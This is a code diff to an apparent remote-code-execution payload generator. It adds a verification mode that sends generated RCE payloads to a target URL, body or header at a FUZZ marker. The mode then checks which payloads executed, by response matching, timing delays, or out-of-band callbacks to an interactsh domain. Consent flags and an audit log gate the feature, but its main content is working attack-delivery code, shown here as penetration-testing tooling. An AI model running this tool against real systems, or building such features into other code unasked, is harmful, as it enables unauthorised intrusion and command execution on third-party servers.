@@ -979,6 +979,82 @@ class RCEPayloadGenerator:
             f"{matcher}\n"
         )
 
+    def _evaluate_verify(self, record: PayloadRecord, status: Optional[int], body: str,
+                         elapsed: float, baseline: float) -> Tuple[str, str]:
+        """Apply the payload's built-in oracle to a target response."""
+        if status is None:
+            return "error", body[:80]
+        if record.expected_channel == "interactsh":
+            return "oob-pending", f"watch token {record.token} at your OOB listener"
+        if record.expected_channel == "timing" or record.blocking:
+            if elapsed - baseline >= 2.0:
+                return "confirmed", f"delay {elapsed:.1f}s vs baseline {baseline:.1f}s"
+            return "no-delay", f"{elapsed:.1f}s"
+        if record.match:
+            if re.search(record.match, body):
+                return "confirmed", f"matched /{record.match}/"
+            return "no-match", ""
+        return "no-signature", "no machine-readable oracle for this payload"
+
+    def run_verification(self, records: Iterator[PayloadRecord], url: str, method: str = "GET",
+                         data: Optional[str] = None, headers: Optional[List[str]] = None,
+                         delay: float = 0.0, timeout: float = 8.0,
+                         max_payloads: Optional[int] = None) -> List[Dict[str, Any]]:
+        """Fire payloads at an AUTHORISED target and confirm execution via each
+        payload's oracle (match regex / canary token / timing). The FUZZ marker in
+        the URL / data / headers is replaced with the payload.
+        """
+        import time
+        import urllib.request
+        import urllib.error
+
+        MARK = "FUZZ"
+
+        def build(payload: str):
+            encoded = urllib.parse.quote(payload, safe="")
+            target = url.replace(MARK, encoded)
+            body = data.replace(MARK, encoded).encode() if data else None
+            hdrs: Dict[str, str] = {"User-Agent": "rcpayloadgen-verify"}
+            for header in headers or []:
+                name, _, value = header.partition(":")
+                hdrs[name.strip()] = value.strip().replace(MARK, payload)
+            return target, body, hdrs
+
+        def fire(payload: str):
+            target, body, hdrs = build(payload)
+            request = urllib.request.Request(target, data=body, headers=hdrs, method=method)
+            start = time.time()
+            try:
+                with urllib.request.urlopen(request, timeout=timeout) as response:
+                    return response.status, response.read().decode(errors="replace"), time.time() - start
+            except urllib.error.HTTPError as exc:
+                return exc.code, exc.read().decode(errors="replace"), time.time() - start
+            except Exception as exc:  # network error, timeout, etc.
+                return None, str(exc), time.time() - start
+
+        # Baseline latency from a benign request, used by the timing oracle.
+        _, _, baseline = fire(f"rcpg-baseline-{self._generate_canary()}")
+
+        results: List[Dict[str, Any]] = []
+        seen: Set[str] = set()
+        for record in records:
+            if record.payload in seen:
+                continue
+            seen.add(record.payload)
+            status, body, elapsed = fire(record.payload)
+            verdict, detail = self._evaluate_verify(record, status, body, elapsed, baseline)
+            results.append({
+                "verdict": verdict, "detail": detail, "status": status,
+                "payload": record.payload, "category": record.category,
+                "environment": record.environment, "context": record.context,
+                "encoding": record.encoding, "token": record.token,
+            })
+            if delay:
+                time.sleep(delay)
+            if max_payloads and len(results) >= max_payloads:
+                break
+        return results
+
     def log_exploitation_usage(self, watermark_token: str, arguments: argparse.Namespace) -> None:
         audit_path = Path("exploit_audit.log")
         try:
@@ -1016,6 +1092,18 @@ def main():
                         help="text/jsonl single file, burp (per-context wordlists + request template), or nuclei (runnable templates)")
     parser.add_argument("--oob-domain", default=None,
                         help="Collaborator/interactsh domain for out-of-band payloads; each payload gets a unique subdomain token")
+    parser.add_argument("--verify-url", default=None,
+                        help="AUTHORISED target URL with a FUZZ marker; fires payloads and confirms execution via each payload's oracle instead of writing a file")
+    parser.add_argument("--verify-method", default=None,
+                        help="HTTP method for --verify-url (default GET, or POST when --verify-data is set)")
+    parser.add_argument("--verify-data", default=None,
+                        help="Request body for verification; put FUZZ where the payload goes")
+    parser.add_argument("--verify-header", action="append", default=None,
+                        help="Header 'Name: value' for verification (repeatable); may contain FUZZ")
+    parser.add_argument("--verify-delay", type=float, default=0.0,
+                        help="Seconds to wait between verification requests (rate limiting)")
+    parser.add_argument("--verify-timeout", type=float, default=8.0,
+                        help="Per-request timeout for verification (seconds)")
     parser.add_argument("--include-metadata", action="store_true",
                         help="Write indicator and safety metadata alongside payload output")
     parser.add_argument("--max-safety", choices=["safe", "intrusive", "stateful"], default=None,
@@ -1094,6 +1182,49 @@ def main():
         max_safety = "intrusive"
         if not oob_domain:
             oob_domain = "oob.interact.sh"
+
+    if args.verify_url:
+        if not args.acknowledge_consent:
+            print("[!] --verify-url actively sends payloads to the target. Re-run with "
+                  "--acknowledge-consent to confirm you are authorised to test it.")
+            return
+        if "FUZZ" not in args.verify_url and not (args.verify_data and "FUZZ" in args.verify_data) \
+                and not any("FUZZ" in h for h in (args.verify_header or [])):
+            print("[!] No FUZZ marker found in --verify-url/--verify-data/--verify-header; "
+                  "add FUZZ where the payload should be injected.")
+            return
+        method = args.verify_method or ("POST" if args.verify_data else "GET")
+        verify_token = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
+        generator.log_exploitation_usage(f"VERIFY:{verify_token} url={args.verify_url}", args)
+        records = generator.generate_payload_records(
+            selected_contexts=selected_contexts, selected_categories=selected_categories,
+            selected_encodings=selected_encodings, selected_environments=selected_environments,
+            mode=mode, watermark_token=watermark_token, max_safety=max_safety,
+            include_blocking=include_blocking, oob_domain=oob_domain,
+        )
+        print(f"[verify] {method} {args.verify_url}  (authorised target)")
+        results = generator.run_verification(
+            records, url=args.verify_url, method=method, data=args.verify_data,
+            headers=args.verify_header, delay=args.verify_delay, timeout=args.verify_timeout,
+            max_payloads=args.max_payloads,
+        )
+        by_verdict: Dict[str, int] = {}
+        for result in results:
+            by_verdict[result["verdict"]] = by_verdict.get(result["verdict"], 0) + 1
+        confirmed = [r for r in results if r["verdict"] == "confirmed"]
+        print(f"[verify] sent {len(results)} unique payloads: " +
+              ", ".join(f"{v}={c}" for v, c in sorted(by_verdict.items())))
+        if confirmed:
+            print(f"\n[verify] CONFIRMED execution ({len(confirmed)}):")
+            for result in confirmed:
+                print(f"  [{result['category']}/{result['context']}] {result['payload']}   ({result['detail']})")
+        oob_pending = [r for r in results if r["verdict"] == "oob-pending"]
+        if oob_pending:
+            print(f"\n[verify] {len(oob_pending)} OOB payloads sent — check your listener for the tokens.")
+        if not confirmed and not oob_pending:
+            print("\n[verify] No execution confirmed. The target may be patched, or the payloads "
+                  "may not fit its sink/context (try --target-profile or a different --environments/--contexts).")
+        return
 
     if args.output_format == "text" and not args.include_metadata and selected_encodings:
         risky = sorted(set(selected_encodings) & generator.decoder_required_encodings)
